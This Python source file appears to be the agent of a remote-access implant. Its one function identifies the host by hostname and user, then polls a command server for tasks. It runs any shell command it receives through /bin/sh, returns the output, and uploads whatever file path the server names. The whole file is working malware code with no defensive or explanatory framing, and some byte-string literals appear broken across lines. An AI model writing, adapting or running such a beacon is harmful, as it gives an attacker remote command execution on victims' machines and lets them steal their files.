import getpass
import json
import socket
import subprocess
import urllib.request

def poll_and_execute(base_url: str) -> None:
    client_id = f"{socket.gethostname()}_{getpass.getuser()}"
    req = urllib.request.Request(
        f"{base_url}/api/poll",
        data=json.dumps({"client_id": client_id}).encode("utf-8"),
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        task = json.loads(resp.read().decode("utf-8"))
    if task.get("kind") == "exec":
        out = subprocess.check_output(["/bin/sh", "-c", task["arg"]])
        res = urllib.request.Request(
            f"{base_url}/api/result",
            data=json.dumps({"client_id": client_id, "out": out.decode("utf-8", "ignore")}).encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(res, timeout=15).read()
    elif task.get("kind") == "exfil":
        raw = open(task["path"], "rb").read()
        body = (
            b"--Bound991
"
            b'Content-Disposition: form-data; name="file"; filename="out.bin"

'
            + raw
            + b"
--Bound991--
"
        )
        up = urllib.request.Request(
            f"{base_url}/api/upload",
            data=body,
            headers={"Content-Type": "multipart/form-data; boundary=Bound991"},
        )
        urllib.request.urlopen(up, timeout=15).read()
